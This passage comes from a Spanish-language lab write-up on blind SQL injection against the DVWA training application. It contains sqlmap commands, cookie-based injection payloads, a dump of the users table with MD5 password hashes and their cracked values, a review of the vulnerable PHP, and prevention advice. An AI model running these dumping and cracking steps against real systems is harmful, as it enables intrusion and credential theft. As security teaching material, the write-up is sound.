[19:31:44] [INFO] resumed: last_login
[19:31:44] [INFO] resumed: timestamp
[19:31:44] [INFO] resumed: failed_login
[19:31:44] [INFO] resumed: int(3)
[19:31:44] [INFO] resumed: role
[19:31:44] [INFO] resumed: varchar(20)
[19:31:44] [INFO] resumed: account_enabled
[19:31:44] [INFO] resumed: tinyint(1)
Database: dvwa
Table: users
[10 columns]
+-----------------+-------------+
| Column          | Type        |
+-----------------+-------------+
| role            | varchar(20) |
| user            | varchar(15) |
| account_enabled | tinyint(1)  |
| avatar          | varchar(70) |
| failed_login    | int(3)      |
| first_name      | varchar(15) |
| last_login      | timestamp   |
| last_name       | varchar(15) |
| password        | varchar(32) |
| user_id         | int(6)      |
+-----------------+-------------+

[19:31:44] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/192.168.100.4'

[*] ending @ 19:31:44 /2026-05-20/
```

```bash
# Extraer contenido
┌──(kali㉿kali)-[~]
└─$ sqlmap -r request_high.txt -D dvwa -T users --dump --level=2

        ___
       __H__
 ___ ___["]_____ ___ ___  {1.10.3#stable}
|_ -| . [(]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 19:32:04 /2026-05-20/

[19:32:04] [INFO] parsing HTTP request from 'request_high.txt'
[19:32:04] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
do you want to try URI injections in the target URL itself? [Y/n/q] Y
[19:32:05] [INFO] resuming back-end DBMS 'mysql'
[19:32:05] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (Cookie)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1' AND 5367=5367 AND 'zaxq'='zaxq; security=high; PHPSESSID=0q5nebn9sr5bbifebj5uop4v6b

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 1508 FROM (SELECT(SLEEP(5)))Ussk) AND 'XRya'='XRya; security=high; PHPSESSID=0q5nebn9sr5bbifebj5uop4v6b
---
[19:32:06] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.58
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[19:32:06] [INFO] fetching columns for table 'users' in database 'dvwa'
[19:32:06] [INFO] resumed: 10
[19:32:06] [INFO] resumed: user_id
[19:32:06] [INFO] resumed: first_name
[19:32:06] [INFO] resumed: last_name
[19:32:06] [INFO] resumed: user
[19:32:06] [INFO] resumed: password
[19:32:06] [INFO] resumed: avatar
[19:32:06] [INFO] resumed: last_login
[19:32:06] [INFO] resumed: failed_login
[19:32:06] [INFO] resumed: role
[19:32:06] [INFO] resumed: account_enabled
[19:32:06] [INFO] fetching entries for table 'users' in database 'dvwa'
[19:32:06] [INFO] fetching number of entries for table 'users' in database 'dvwa'
[19:32:06] [INFO] resumed: 5
[19:32:06] [INFO] resumed: admin
[19:32:06] [INFO] resumed: admin
[19:32:06] [INFO] resumed: 1
[19:32:06] [INFO] resumed: /dvwa/hackable/users/admin.jpg
[19:32:06] [INFO] resumed: 2
[19:32:06] [INFO] resumed: admin
[19:32:06] [INFO] resumed: 2026-04-27 16:05:12
[19:32:06] [INFO] resumed: admin
[19:32:06] [INFO] resumed: 5f4dcc3b5aa765d61d8327deb882cf99
[19:32:06] [INFO] resumed: 1
[19:32:06] [INFO] resumed: user
[19:32:06] [INFO] resumed: smithy
[19:32:06] [INFO] resumed: 1
[19:32:06] [INFO] resumed: /dvwa/hackable/users/smithy.jpg
[19:32:06] [INFO] resumed: 0
[19:32:06] [INFO] resumed: Bob
[19:32:06] [INFO] resumed: 2026-04-24 09:50:14
[19:32:06] [INFO] resumed: Smith
[19:32:06] [INFO] resumed: 5f4dcc3b5aa765d61d8327deb882cf99
[19:32:06] [INFO] resumed: 5
[19:32:06] [INFO] resumed: user
[19:32:06] [INFO] resumed: 1337
[19:32:06] [INFO] resumed: 1
[19:32:06] [INFO] resumed: /dvwa/hackable/users/1337.jpg
[19:32:06] [INFO] resumed: 0
[19:32:06] [INFO] resumed: Hack
[19:32:06] [INFO] resumed: 2026-04-24 09:50:14
[19:32:06] [INFO] resumed: Me
[19:32:06] [INFO] resumed: 8d3533d75ae2c3966d7e0d4fcc69216b
[19:32:06] [INFO] resumed: 3
[19:32:06] [INFO] resumed: user
[19:32:06] [INFO] resumed: pablo
[19:32:06] [INFO] resumed: 1
[19:32:06] [INFO] resumed: /dvwa/hackable/users/pablo.jpg
[19:32:06] [INFO] resumed: 0
[19:32:06] [INFO] resumed: Pablo
[19:32:06] [INFO] resumed: 2026-04-24 09:50:14
[19:32:06] [INFO] resumed: Picasso
[19:32:06] [INFO] resumed: 0d107d09f5bbe40cade3de5c71e9e9b7
[19:32:06] [INFO] resumed: 4
[19:32:06] [INFO] resumed: user
[19:32:06] [INFO] resumed: smithy
[19:32:06] [INFO] resumed: 1
[19:32:06] [INFO] resumed: /dvwa/hackable/users/smithy.jpg
[19:32:06] [INFO] resumed: 0
[19:32:06] [INFO] resumed: Bob
[19:32:06] [INFO] resumed: 2026-04-24 09:50:14
[19:32:06] [INFO] resumed: Smith
[19:32:06] [INFO] resumed: 5f4dcc3b5aa765d61d8327deb882cf99
[19:32:06] [INFO] resumed: 5
[19:32:06] [INFO] recognized possible password hashes in column 'password'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y
[19:32:08] [INFO] writing hashes to a temporary file '/tmp/sqlmap5ch6fsr2150876/sqlmaphashes-tjhmd43n.txt'
do you want to crack them via a dictionary-based attack? [Y/n/q] y
[19:32:09] [INFO] using hash method 'md5_generic_passwd'
[19:32:09] [INFO] resuming password 'password' for hash '5f4dcc3b5aa765d61d8327deb882cf99'
[19:32:09] [INFO] resuming password 'charley' for hash '8d3533d75ae2c3966d7e0d4fcc69216b'
[19:32:09] [INFO] resuming password 'letmein' for hash '0d107d09f5bbe40cade3de5c71e9e9b7'
Database: dvwa
Table: users
[5 entries]
+---------+--------+--------+---------------------------------+---------------------------------------------+-----------+------------+---------------------+--------------+-----------------+
| user_id | role   | user   | avatar                          | password                                    | last_name | first_name | last_login          | failed_login | account_enabled |
+---------+--------+--------+---------------------------------+---------------------------------------------+-----------+------------+---------------------+--------------+-----------------+
| 1       | admin  | admin  | /dvwa/hackable/users/admin.jpg  | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | admin     | admin      | 2026-04-27 16:05:12 | 2            | 1               |
| 5       | user   | smithy | /dvwa/hackable/users/smithy.jpg | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | Smith     | Bob        | 2026-04-24 09:50:14 | 0            | 1               |
| 3       | user   | 1337   | /dvwa/hackable/users/1337.jpg   | 8d3533d75ae2c3966d7e0d4fcc69216b (charley)  | Me        | Hack       | 2026-04-24 09:50:14 | 0            | 1               |
| 4       | user   | pablo  | /dvwa/hackable/users/pablo.jpg  | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein)  | Picasso   | Pablo      | 2026-04-24 09:50:14 | 0            | 1               |
| 5       | user   | smithy | /dvwa/hackable/users/smithy.jpg | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | Smith     | Bob        | 2026-04-24 09:50:14 | 0            | 1               |
+---------+--------+--------+---------------------------------+---------------------------------------------+-----------+------------+---------------------+--------------+-----------------+

[19:32:09] [INFO] table 'dvwa.users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/192.168.100.4/dump/dvwa/users.csv'
[19:32:09] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/192.168.100.4'

[*] ending @ 19:32:09 /2026-05-20/
```

Los resultados son equivalentes a los obtenidos en el nivel `medium`: tablas `users`, `guestbook`, `access_log`, `security_log` y los mismos 10 campos en la tabla `users`.

---

#### Hashcracking (High)

```bash
sqlmap -r request_high.txt -D dvwa -T users -C user,password --dump --level=2 --threads 5
```

| Parámetro     | Descripción                                                  |
| ------------- | ------------------------------------------------------------ |
| `--threads 5` | Usa 5 hilos en paralelo para acelerar la extracción de datos |

El resultado es idéntico al obtenido en el nivel `medium`: las mismas 5 contraseñas crackeadas con ataque de diccionario.

> **Nota:** El uso de `--threads` reduce significativamente el tiempo de extracción en ataques `time-based blind`, que son inherentemente lentos al depender de los tiempos de respuesta del servidor.

---

## 3. Revisión del código fuente

### Nivel Low — sin protección

```php
$id = $_GET[ 'id' ];
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
```

El valor de `$id` se incorpora directamente a la consulta SQL sin ningún tipo de validación ni saneamiento. Cualquier entrada del usuario modifica la consulta.

### Nivel Medium — protección insuficiente

```php
$id = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $id);
$query = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
```

Se usa `mysqli_real_escape_string` para escapar caracteres especiales como `'` y `"`, pero el parámetro **no está entrecomillado** en la consulta. Esto permite inyecciones numéricas directas (`OR 1=1`, `AND 1=2`, etc.) sin necesidad de comillas.

### Nivel High — sin validación de la cookie

```php
$id = $_COOKIE[ 'id' ];
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;";
```

El valor se lee directamente de la cookie sin ninguna validación. Además, en caso de fallo se introduce un retardo aleatorio como mecanismo de defensa:

```php
if( rand( 0, 5 ) == 3 ) {
    sleep( rand( 2, 4 ) );
}
```

---

## 4. Prevención

Aunque las técnicas de localización y explotación para Blind SQLi son diferentes a las de SQLi normal, las **medidas de prevención son equivalentes**:

**Consultas parametrizadas (prepared statements)**

Es la medida más efectiva. Evita que la entrada del usuario se interprete como parte de la consulta SQL:

```php
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = :username");
$stmt->bindParam(':username', $userInput);
$stmt->execute();
```

Ejemplo del nivel `impossible` de DVWA:

```php
$data = $db->prepare('SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;');
$data->bindParam(':id', $id, PDO::PARAM_INT);
$data->execute();
```

> **Importante:** Las consultas parametrizadas solo son válidas para **valores de datos** (cláusulas `WHERE`, `INSERT`, `UPDATE`). Para nombres de tablas, columnas o cláusulas `ORDER BY` deben emplearse **listas blancas** (_whitelists_).

**Validación y saneamiento de entradas**

```php
// Comprobar que el valor es numérico antes de usarlo
if(is_numeric($id)) {
    $id = intval($id);
    // continuar con el procesamiento...
}
```

**Principio de mínimo privilegio**

La cuenta de base de datos usada por la aplicación debe tener los **mínimos privilegios posibles**: solo `SELECT` en las tablas necesarias, sin acceso a `information_schema`, sin permisos de escritura ni de administración.

**Gestión de errores**

Evitar que los errores de base de datos lleguen al usuario. Usar logs internos en lugar de mensajes de error en pantalla.

**Web Application Firewall (WAF)**

Implementar un WAF que detecte y bloquee patrones de inyección SQL conocidos. No debe ser la única capa de defensa.

> **Recuerda:** Ninguna medida aislada es suficiente. La seguridad en profundidad (_defense in depth_) combina múltiples capas: validación de entrada, consultas parametrizadas, mínimo privilegio y monitorización de logs.
